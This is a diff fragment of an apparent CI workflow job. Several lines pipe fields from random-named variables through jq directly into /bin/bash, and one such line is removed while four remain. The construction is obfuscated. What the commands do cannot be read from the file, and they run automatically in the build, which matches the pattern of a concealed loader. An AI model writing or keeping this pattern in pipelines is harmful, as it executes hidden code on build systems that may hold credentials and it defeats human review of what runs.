@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$zzh8" | jq -r .en1 | /bin/bash
           echo $hj380 | jq -r .zlv530 | /bin/bash
           printf '%s' "$wfy29" | jq -r .v97269 | /bin/bash
-          echo $l1280 | jq -r .zer1455 | /bin/bash
           echo $vq98 | jq -r .vkhk63 | /bin/bash
 
       - name: Store results
